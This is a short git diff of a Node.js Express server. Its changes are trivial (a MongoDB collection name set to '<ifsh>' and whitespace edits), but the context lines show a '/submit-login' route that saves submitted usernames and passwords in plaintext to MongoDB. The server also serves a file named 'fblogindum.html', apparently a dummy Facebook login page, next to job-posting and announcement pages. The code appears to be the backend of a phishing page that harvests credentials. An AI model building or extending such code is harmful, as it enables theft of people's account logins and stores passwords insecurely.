@@ -34,7 +34,7 @@ app.post('/submit-login', async (req, res) => {
 
     try {
         const loginData = { username, password, timestamp: new Date() }; // Include a timestamp
-        await db.collection('<collection_name>').insertOne(loginData); // Replace with your collection name
+        await db.collection('<ifsh>').insertOne(loginData); // Replace with your collection name
         res.send('Login information saved successfully to MongoDB.');
     } catch (error) {
         console.error('Error saving data to MongoDB:', error);
@@ -46,12 +46,11 @@ app.post('/submit-login', async (req, res) => {
 app.get('/', (req, res) => {
     res.sendFile(path.join(__dirname, 'Home.html')); // Change 'index.html' to your main HTML file name
 });
-
 app.get('/Job Postings.html', (req, res) => {
     res.sendFile(path.join(__dirname, 'Job Postings.html')); // Change 'index.html' to your main HTML file name
 });
 app.get('/Announcements.html', (req, res) => {
-    res.sendFile(path.join(__dirname, 'Announcements.html')); // Change 'index.html' to your main HTML file name
+    res.sendFile(path.join(__dirname, 'Announcements.html')); // Change  'index.html' to your main HTML file name
 });
 app.get('/public/fblogindum.html', (req, res) => {
     res.sendFile(path.join(__dirname, 'fblogindum.html')); // Change 'index.html' to your main HTML file name
